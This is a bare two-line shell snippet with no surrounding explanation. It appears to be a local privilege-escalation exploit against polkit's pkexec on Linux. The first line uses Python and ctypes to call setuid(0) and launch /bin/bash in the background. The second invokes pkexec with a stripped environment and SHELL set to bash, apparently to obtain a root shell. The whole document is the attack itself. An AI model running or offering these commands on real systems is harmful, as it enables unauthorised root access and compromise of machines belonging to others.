python3 -c 'import os;from ctypes import CDLL;libc=CDLL("libc.so.6");libc.setuid(0);os.system("/bin/bash")' &
env -i SHELL=/bin/bash XAUTHORITY=/dev/null /usr/bin/pkexec
